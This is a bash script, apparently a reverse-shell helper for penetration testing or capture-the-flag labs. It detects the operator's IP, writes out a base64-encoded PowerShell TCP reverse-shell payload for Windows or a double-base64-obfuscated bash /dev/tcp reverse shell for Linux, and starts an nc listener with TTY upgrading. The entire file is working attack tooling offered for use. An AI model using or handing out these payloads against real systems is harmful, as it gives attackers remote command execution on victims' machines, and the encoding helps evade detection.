#!/bin/bash

if ip link show tun0 &>/dev/null; then
    ip="$(ip addr show tun0 | grep 'inet ' | awk '{ print $2 }' | cut -d/ -f1)"
else
    ip="$(hostname -I | awk '{ print $1 }')"
fi

usage() {
    echo "Usage: $0 -p <port> [-w] [-i <ip>]"
    echo "Options:"
    echo "  -p <port>      Port number (required)"
    echo "  -i <ip>        IP address (default: $ip)"
    echo "  -w             Listen for Windows connections"
    echo "  -h, --help     Show this help message and exit"
    exit 1
}

listen() {
    echo -e "[*] Listening on $ip:$port...\n"
    if [[ $w -eq 1 ]]; then
	    payload=$(echo '$c = New-Object System.Net.Sockets.TCPClient("$ip",$port);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$r = (iex $d 2>&1 | Out-String );$r2  = $r + "PS " + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()' | sed "s/\$ip/$ip/" | sed "s/\$port/$port/" | iconv -t UTF-16LE | base64 -w 0)
        echo -e "[+] Payload:\npowershell -e $payload\n"
        touch .rlwrap_history && stty intr '' && rlwrap -c -a -i -r -A -D 2 -H ./.rlwrap_history -s 1000 -b "'"\," -q ""'" -pBlue -e "" -f . nc -nlvp "$port"
        stty intr ^c
    else
	    payload=$(echo "echo $(echo -e "bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" & disown" | base64 -w 0 | base64 -w 0) | base64 -d | base64 -d | bash")
    	echo -e "[+] Payload:\n$payload\n"
    	(echo 'script -qc /bin/bash /dev/null' && echo "export TERM=xterm && export SHELL=/bin/bash && stty $(stty -a | grep -oP 'rows [0-9]+; columns [0-9]+' | tr -d ';')" && stty raw -echo && /bin/cat; stty sane) | nc -nlvp $port
    fi
}

if [ $# -eq 0 ]; then
  usage
fi

while [[ "$#" -gt 0 ]]; do
    case $1 in
        -p)
            if [ -z "$2" ]; then
                echo "[!] Error: Option -p requires a port number."
                usage
            fi
            port="$2"
            shift 2
            ;;
        -i)
            if [ -z "$2" ]; then
                echo "[!] Error: Option -i requires an IP address."
                usage
            fi
            ip="$2"
            shift 2
            ;;
        -w)
            w=1
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo "[!] Error: Unknown option '$1'."
            usage
            ;;
    esac
done

if [ -z "$port" ]; then
    echo "[!] Error: Port is required."
    usage
fi

listen
